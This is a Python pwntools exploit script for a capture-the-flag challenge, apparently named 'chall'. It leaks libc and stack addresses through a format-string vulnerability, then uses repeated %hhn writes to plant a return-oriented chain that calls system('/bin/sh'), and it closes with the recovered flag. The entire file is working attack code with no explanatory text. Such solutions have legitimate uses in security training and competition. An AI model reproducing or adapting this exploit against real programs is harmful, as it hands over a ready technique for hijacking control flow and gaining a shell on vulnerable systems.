from pwn import *
context.binary = "./chall_patched"
script="""
b*vuln+105
"""
p = process()
#p = remote("34.70.212.151",8008)
#gdb.attach(p,script)
def choice(choose: bytes):
    p.sendlineafter(b'>>', choose)



def restart(to_write: int, add: int):
    choice(b'2')
    #time.sleep(0.2)
    p.recv()
    p.sendline(f'%{to_write}c%8$hhn'.encode().ljust(16,b'.')+p64(add))


def write_1_byte(addr: int, data: int):
    payload = b''
    if data==0:
        payload = f'%8$hhn'.encode().ljust(16,b'.')
    else:
        payload = f'%{data}c%8$hhn'.encode().ljust(16,b'.')
    payload += p64(addr)
    choice(b'2')
    #time.sleep(0.2)
    p.recv()
    p.sendline(payload)

def write_8_bytes(addr: int, data: int, vuln_ret: int):
    count = 0
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
    ]
    for i in range(0,len(to_write)*2):
        if i!=0 and i%2!=0:
            restart(90,vuln_ret)
            log.info("Restarting...")
            count +=1
        else:
            write_1_byte(addr+count,to_write[count])
            log.info("Hacking...")



choice(b'1')
p.recvuntil(b'Have this: ')
leak_fgets = int(p.recvline().strip(b'\n'),base=16)

libc_base = leak_fgets - 0x81600
leak_system = libc_base + 0x55230

pop_rdi = libc_base + 0x0000000000028715
ret = pop_rdi + 1
bin_sh = libc_base +  0x1c041b
log.info("Leak fgets: %s",hex(leak_fgets))
choice(b'2')
p.recv()
p.sendline(b'%12$llo|%13$llo')

print(p.recvuntil(b'Input\n>> '))
leak = p.recvline().strip(b'\n').split(b'|')
print(leak)
leak_stack = int(leak[0],base=8)
leak_near_main=int(leak[1],base=8)

to_write = hex(leak_near_main)[-4]+'65a'
to_write = int(to_write,16)
log.info("Leak stack: %s",hex(leak_stack))
log.info("Leak near main: %s", hex(leak_near_main))
leak_rip = leak_stack + 0x8
ret_vuln = leak_stack-0x18
log.info("Leak rip: %s",hex(leak_rip))
choice(b'2')
p.recv()
p.sendline(f'%90c%8$hhn'.encode().ljust(16,b'.')+p64(ret_vuln))

#time.sleep(0.2)

#gdb.attach(p,script)

#print(p.recv())

write_8_bytes(leak_rip,ret,ret_vuln)
time.sleep(0.2)
write_8_bytes(leak_rip+8,pop_rdi,ret_vuln)
time.sleep(0.2)
write_8_bytes(leak_rip+16,bin_sh,ret_vuln)
time.sleep(0.2)
write_8_bytes(leak_rip+24,leak_system,ret_vuln)
time.sleep(0.2)

choice(b'4')
time.sleep(0.2)
log.success("Complete hacking. Here is your shell :)")
p.interactive()

#Flag: flag{A_f0rm47_5tr1ng_w1th0ut_l33k}
